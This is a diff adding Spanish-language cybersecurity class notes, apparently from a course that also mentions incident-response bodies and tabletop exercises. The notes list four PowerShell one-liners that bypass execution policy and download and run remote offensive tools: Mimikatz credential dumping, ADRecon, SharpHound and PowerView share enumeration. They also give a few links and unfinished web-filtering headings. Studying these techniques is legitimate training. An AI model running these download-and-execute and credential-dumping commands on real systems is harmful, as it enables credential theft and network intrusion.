@@ -8,3 +8,31 @@ first.org[https://www.first.org/]
 incibe [https://www.incibe.es]
 Table top exercise: Metodologia, arquitectura, funcionamiento, sumilacion, crisis, cibernetica.
 
+----------------CLASE 2-------------------------
+Comandos de powershell:
+    1.powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
+    2.powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')
+    3.powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
+    4.powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
+
+
+    LINKS:
+    https://shorturl.at/puBJX
+    https://www.iso.org/standard/63461.html
+    https://urlscan.io/
+
+
+Web Reputation:
+    1.Niveles altos de riesgo
+    2.Alto
+    3.Medio
+    4.Bajo
+
+
+
+Web filtering:
+    1.
+    2.
+    3.
+    4.:
+
